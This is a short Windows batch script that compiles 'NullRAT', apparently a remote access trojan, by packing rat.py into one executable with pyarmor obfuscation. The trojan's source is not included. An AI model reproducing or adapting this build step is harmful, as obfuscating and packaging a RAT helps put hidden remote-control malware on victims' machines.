@echo off & title Compiling RAT & color 3
echo Compiling NullRAT
echo ----------------- & echo.
pyarmor pack --clean -e "--onefile " rat.py & cls 
if %errorlevel% == 0 (echo Successfully compiled! & exit /b 0) else (echo Not compiled successfully :[ & echo. & pause & exit /b 1)
